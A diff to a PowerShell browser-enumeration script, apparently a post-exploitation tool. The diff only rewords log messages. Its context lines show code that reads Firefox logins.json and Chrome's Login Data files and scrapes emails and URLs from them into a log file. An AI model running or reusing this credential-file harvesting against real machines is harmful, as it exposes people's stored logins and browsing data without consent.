@@ -606,7 +606,7 @@ function FIREFOX {
     echo "------------------" >> $LogFilePath\BrowserEnum.log
     If(-not(Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\logins.json")){
         If(-not(Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json")){
-            echo "{None Credentials found}" >> $LogFilePath\BrowserEnum.log
+            echo "{None URL's found}" >> $LogFilePath\BrowserEnum.log
         }else{
             $ReadData = Get-Content "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json" 
             $SplitData = $ReadData -split(',')
@@ -710,7 +710,7 @@ function CHROME {
             $Search_Email = $Parse_String|select-string "email"
             $Parse_Dump = $Search_Email -replace '"','' -replace 'email:',''
             If(-not($Search_Email) -or $Search_Email -eq $null){
-                echo "Email            : {None Email Found}`n" >> $LogFilePath\BrowserEnum.log
+                echo "Email            : {None Email's Found}`n" >> $LogFilePath\BrowserEnum.log
             }else{
                 ## Build new PSObject to store emails found
                 $Store = ForEach ($Email in $Parse_Dump){
@@ -762,7 +762,7 @@ function CHROME {
         echo "`nEnumerating LogIns" >> $LogFilePath\BrowserEnum.log
         echo "------------------" >> $LogFilePath\BrowserEnum.log
         If(-not(Test-Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data")){
-            echo "{None Credentials found}" >> $LogFilePath\BrowserEnum.log
+            echo "{None URL's found}" >> $LogFilePath\BrowserEnum.log
         }else{
             $Regex = '(htt(p|s))://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
             $ReadData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
